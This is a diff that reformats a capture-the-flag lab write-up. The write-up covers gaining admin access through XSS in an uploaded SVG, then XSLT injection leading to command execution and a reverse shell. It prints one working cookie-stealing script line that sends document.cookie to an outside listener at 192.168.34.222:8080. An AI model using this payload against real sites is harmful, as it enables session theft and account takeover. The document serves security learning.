@@ -46,7 +46,7 @@ I dcecided to quickly check out ```/files/``` and ```/assets/``` since they retu
 With that out of the way, I knew I was going to have to get an admin account to access ```dashboard.php```. Based on the lab's description I knew this was going to require exploiting an XSS vulnerability. Luckily enough, the ```process.php``` error message pretty much screamed XSS:
 
 
-```
+```bash
 contact.php?req=failed#:~:text=Unable%20to%20send%20your%20Feedback.%20Only%20image%20files%20are%20allowed
 ```
 
@@ -68,8 +68,10 @@ Anyone responding to a message on a Contact Us web page will most likely have so
 
 ![svg payload](/assets/img/needle/08-needle-svg-payload.png)
 
-Most of the code here is just standard boilerplate stuff. I threw in the rectangle and text blocks at the bottom just so the image would kind of look like an actual image, but that part isn't necessary. The only actual malicious part of this is:
-```JavaScript
+Most of the code here is just standard boilerplate stuff. I threw in the rectangle and text blocks at the bottom just so the image would kind of look like an actual image, but that part isn't necessary. 
+
+The only actual malicious part of this is:
+```bash
 <script type="text/javascript>
 window.location='http://192.168.34.222:8080/?cookie-' + document.cookie;
 </script>
@@ -110,7 +112,9 @@ Anyway, now that I finally had access to the dashboard, there was immediately so
 
 The key thing here is: ```xsl_path=discharge_summary.xsl&name=test&diagnosis=test&treatment=test```
 
-The lab description told me that I would be using XSLT injection to achieve RCE, so I pretty much knew this had to be it. The first thing I wanted to do was download ```discharge_summary.xsl```. This turned out to be pretty straightforward, and all I had to do was send a GET request:
+The lab description told me that I would be using XSLT injection to achieve RCE, so I pretty much knew this had to be it. The first thing I wanted to do was download ```discharge_summary.xsl```. 
+
+This turned out to be pretty straightforward, and all I had to do was send a GET request:
 
 ![getting discharge_summary.xsl](/assets/img/needle/13-needle-get-summary.png)
 
@@ -134,7 +138,9 @@ After that I set up a simple Python web server to serve the malicious XSL file, 
 
 ![ls](/assets/img/needle/15-needle-ls.png)
 
-As you can see in the screenshot, it worked! The http response has the output of ```ls -la``` in it, meaning XSLT injection was successful. Now all I had to do was set up a payload to drop a reverse shell.
+As you can see in the screenshot, it worked! 
+
+The http response has the output of ```ls -la``` in it, meaning XSLT injection was successful. Now all I had to do was set up a payload to drop a reverse shell.
 
 ![reverse shell payload](/assets/img/needle/16-needle-RCE-payload.png)
 
@@ -149,6 +155,10 @@ I set back up the Python file server, set up a new netcat listener, and triggere
 And there we go, first and only flag captured.
 
 ## Reflection
-This one definitely took me a bit of time, finishing at a little over 6 hours. I definitely left it open for an hour or two while I wasn't working on it, but this one still took a bit. I'm still happy that I got through it in less than a day though. The http header manipulation took a lot of trial and error, while I'm sure the solution might've been obvious to some, it definitely wasn't to me. At least now I know to try that if I have to do a similar exploit in the future.
+This one definitely took me a bit of time, finishing at a little over 6 hours. 
+
+I definitely left it open for an hour or two while I wasn't working on it, but this one still took a bit. I'm still happy that I got through it in less than a day though. The http header manipulation took a lot of trial and error, while I'm sure the solution might've been obvious to some, it definitely wasn't to me. 
+
+At least now I know to try that if I have to do a similar exploit in the future.
 
 **Tools used:** nmap, gobuster, curl, Burp Suite
